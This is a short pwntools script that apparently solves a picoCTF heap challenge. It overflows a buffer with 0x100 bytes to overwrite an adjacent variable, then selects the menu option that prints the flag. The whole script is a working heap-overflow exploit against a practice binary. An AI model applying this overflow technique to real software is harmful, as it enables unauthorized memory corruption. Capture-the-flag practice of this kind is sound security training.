#!/usr/bin/env python3

from pwn import *

p = process('./heap-0')
# p = remote('tethys.picoctf.net', 54515)

# Overwrite safe_var
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Data for buffer: ', b'A' * 0x100)

# Get flag
p.sendlineafter(b'Enter your choice: ', b'4')
p.interactive()
